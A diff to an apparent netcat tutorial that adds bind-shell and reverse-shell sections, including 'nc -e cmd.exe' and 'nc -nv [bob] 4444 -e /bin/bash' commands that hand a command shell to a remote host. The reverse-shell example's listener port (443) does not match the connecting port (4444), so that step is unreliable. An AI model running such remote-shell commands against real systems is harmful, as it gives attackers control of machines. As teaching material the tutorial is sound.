@@ -84,12 +84,29 @@ nc -nv [host] 110
 (UNKNOWN) [host] 110 (pop3) open
 +OK POP3 server ready
 ```
+### Bind shell
+Bob (Windows) wants Alice (Linux) to connect to his computer remotely and issue commands. Bob sets up a listener which allows anyone connect to port 443 to issue commands via `cmd.exe`:
+```
+nc -nlvp 443 -e cmd.exe
+```
+Alice then connects to Bob's machine and gets a Windows command prompt:
+```
+nc -nv [bob] 443
+```
 ### Reverse shell
-Listen for a reverse shell:
+Netcat can also send a command shell to a listening host. Let's say Alice (Linux) wants Bob (Windows) to issue remote commands to her computer. 
+
+Bob sets up a listener on his machine:
 ```
 nc -nlvp 443
 listening on [any] 443...
 ```
+Alice then sends control of her command prompt to Bob's machine, via netcat:
+```
+nc -nv [bob] 4444 -e /bin/bash
+```
+This is what hackers mean by popping shells, but usually it's getting a web server to send a reverse shell to your attack machine.
+
 ### Transfer files
 To transfer files, set up a listener and redirect the output to a filename:
 ```
